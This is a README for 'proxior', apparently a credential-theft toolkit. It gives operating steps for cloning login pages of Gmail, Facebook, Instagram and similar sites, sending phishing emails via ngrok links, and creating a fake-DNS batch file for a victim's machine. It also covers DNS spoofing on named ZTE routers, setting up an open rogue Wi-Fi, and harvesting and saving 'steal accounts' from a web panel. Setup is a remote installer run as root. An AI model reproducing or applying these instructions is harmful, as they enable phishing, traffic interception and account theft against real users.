# proxior
lan and wifi interception (program for interception all lan and wifi traffic) <br/>

![warning](css/screenshots/warning.jpg) <br/><br/> 

![fake_dns](css/screenshots/fake_dns.png) </br></br>

 
 <font size="7"> 1) SOFTWARE </font> </br>


 <font color='black' size='5'> <b> INSTALLATION </b> </font> <br/>
 
 
 <table>
 
  <tr>
     <td> <img width="100" height="100" src="css/screenshots/system_requirements.png"> </td>
  <td> System requirements (dual core and more, 2gb ram and more) </td>
   </tr>
   
  <tr>
   <td> <img align="left" width="100" height="100" src="css/screenshots/os.jpg"> </td>
   <td>  OS System: (Gnu/linux systems bellow) </td>
  </tr>
  
 <tr>
  <td> <img width="100" height="100" src="css/screenshots/kali-linux.jpg"> </td>
  <td> Kali Linux </td>
 </tr>
     
 <tr>
  <td> <img width="100" height="100" src="css/screenshots/ubuntu.jpg"> </td>
  <td> Ubuntu </td>
 </tr>

<tr>
 <td> <img width="100" height="100" src="css/screenshots/linux-mint.jpg"> </td>
 <td> Linux Mint </td>
</tr>

</table>

<!--
 i) Download the programm unzip and paste folder proxior in to /var/www/ <br/>
ii) Open the terminal and run chmod -R 777 /var/www/proxior <br/>
iii) Open the terminal ang go to /var/www/proxior/ssl path </br>
     This path run the command mkcert -install </br>
     After install run the this comand for create ssl keys for lan network </br> 
      (This ssl keys stop all https connections in aln for (emails and social media) services </br>
      (Only http services worked in the lan) </br>
      (The ssl keys are ready for proxior default) </br>
      (if you want created new keys for block new https services view the filw "use" into ssl folder) </br>
      (example for create ssl keys:) mkcert proxiorkeys gmail.com "*.gmail.com" "*.hotmail.com" "*.yahoo.com" "*.twitter.com" "*.facebook.com" "*.instagram.com" localhost 127.0.0.1 ::1 192.168.2.2 </br>
v) after replace the file lines /etc/apach2/sites-available/default-ssl.conf with them </br>
  
   
    <IfModule mod_ssl.c> </br>
     <VirtualHost _default_:443> </br>
        ServerAdmin admin@proxior.gr </br>
        ServerName proxior.gr </br>  
        ServerAlias www.proxior.gr  </br>
        DocumentRoot /var/www/proxior  </br>
        ErrorLog ${APACHE_LOG_DIR}/error.log </br>
        CustomLog ${APACHE_LOG_DIR}/access.log combined </br>
        SSLEngine on </br> 
        SSLCertificateFile /var/www/proxior/ssl/proxiorkeys+10.pem </br>
        SSLCertificateKeyFile /var/www/proxior/ssl/proxiorkeys+10-key.pem </br>
    <Directory /var/www/proxior> </br>
    Options Indexes FollowSymLinks MultiViews ExecCGI </br>
    AllowOverride None </br>
    Order allow,deny  </br>
    allow from all   </br> 
    </Directory> </br>
        BrowserMatch "MSIE [2-6]" \ </br>
                        nokeepalive ssl-unclean-shutdown \ </br>
                        downgrade-1.0 force-response-1.0 </br>
        BrowserMatch "MSIE [17-9]" ssl-unclean-shutdown </br>
    </VirtualHost> </br>
    </IfModule> </br>


-->
   
i) Download file <b> <a download href="http://proxior.c1.biz/install"> Install </a> </b> and run in terminal with root ex <b> ./install.sh </b> <br>
ii) Turn on the device and connect it to your computer via a LAN or Wi-Fi cable <br/>
iiii) Proxior is ready to use. <br/>

This program have  <br/>

i) Any website clone for manual method <br/>

  a) insert the ip of attacker <br/>
  b) insert a name of a web site and press enter <br/>
  c) The web site it must have http or https protocol <br/>
     Right: http://www.example.com or http://example.com <br/>
     Wrong: www.example.com or example.com <br/>
     
![1](css/screenshots/1.png) <br/><br/> 

 ii) Ready web sites (social media and email) <br/>
 
 a) social media (facebook,instagram,twitter) <br/>
 b) email (gmail,hotmail,yahoo) <br/>

![2](css/screenshots/2.png) <br/><br/> 


Three attack methods </br>

![3](css/screenshots/3.png) <br/><br/> 


a) Fake dns generator for create batch file for computer of victim <br/>
   To find the batch file go to /export/l_win.bat  <br/> <br/>

![5](css/screenshots/5.png) <br/><br/> 


b) Email phishing with ngrok link <br/>
 After install the ngrok in same folder <br/>
 Install ngrok from here https://ngrok.com/ <br/>
 Run th script and clone any website <br/> <br/>
 
 !Notice.. For using email phishing method open the file settings.txt <br/>
 Insert the details your account email (need a email account for send fake emails) <br/>
 e.x <br/>
 email@gmail.com <br/>
 password123456 <br/> 
 Default seetings working for gmail accounts. If you want using another mail change the mail settings from file settings.txt <br/>
 #settings for email server informations <br/>
 debug: 0 </br>
 authentication: true </br>
 tls or ssl: tls </br>
 host: smtp.gmail.com </br>
 port: 465 or 587 </br> 
 
![6.1](css/screenshots/6.1.png) <br/><br/> 


 <font size="7"> 2) HARDWARE </font> </br>
  
 Campatible Devices </br>
  ZTE ZXHN H108N </br>
  ZTE ZXHN H208N </br>
  ZTE ZXHN H220N </br>
  ZTE F620 </br>
  ZTE F620 </br>
  ZTE F660 </br>
  ZTE F668 </br>
  ZTE F680 </br>
  
   ![9](css/screenshots/9.jpg) <br/>
   ![8](css/screenshots/8.jpg) <br/> 

 
c) Dns Spoof (Spoofing and poisoning DNS with hardware device) <br/>
   For this method insert in to device the the dns for spoof <br/>
   For your ip view in to the connection informations or enter ifconfig on terminal <br/>
   For first operation and second operation your use the ip from eth0 <br/>
   For third operation roque wifi use the ip from wlan0 
   e.x <br/>
   dns: www.gmail.com <br/>
   ip: 192.168.2.2 <br/>
   
   This device username and password details. <br/>
   username: proxior <br/>
   password: proxior <br/>
   
   For create new fake dns follow this steps <br/>
   Insert into device: getaway: 192.168.2.1 username: proxior pass: proxior  <br/>
   Go to Application -> DNS Service -> Host <br/>
   Insert into Host Name field the dns for spoof e.x www.instagram.gr <br/>
   Insert into IP Address field the ip from your server e.x 192.168.2.2 <br>
   Press add. Dns spoof registered <br/> <br/>
   
   ![7](css/screenshots/7.png) <br/> 
   ![4](css/screenshots/4.png) <br/><br/> 

   
   You can use this device for three operations <br/>
   
   First operation is router. Connect to dsl cable in to dsl port in device <br/>
   
   Second operqtion is acces point with cable. Connect lan port from device with lan port yo router <br/>
   After disable dchp server form device and give ip = 192.168.2.253 and subnet mask = 255.255.255.0 <br/>
   
   Third operation is created a roque wifi with no internet connection <br/>
   !Attention! The wifi must be open... NO KEYS NO ENCRYPTION..... FREE WIFI <br/> <br/>
   
   For create new attack method or create new atack for begin with different site <br/> 
   Go to UI panel.. your_ip/UI.. e.x 192.168.2.2/UI <br/>
   UI Login credentials. username: proxior@dns and password: proxior@dns <br/>
   Presse clear in UI panel. Now proxior delete all data and start from begin <br/> <br/>
 
   
   For view steal accounts go to UI panel </br>
   Go to UI.. your_ip/UI..  e.x 192.168.2.2/UI <br/>
   For save steal accounts press save from UI panel <br/>
   Save steal accounts in text files in to "stored" folder <br/>
   
   ![10.1](css/screenshots/10.2.png) <br/><br/> 

  

   How it works

![block1](css/screenshots/block1.png) </br></br>

![clonene_diagram](css/clone_diagram.jpg) 
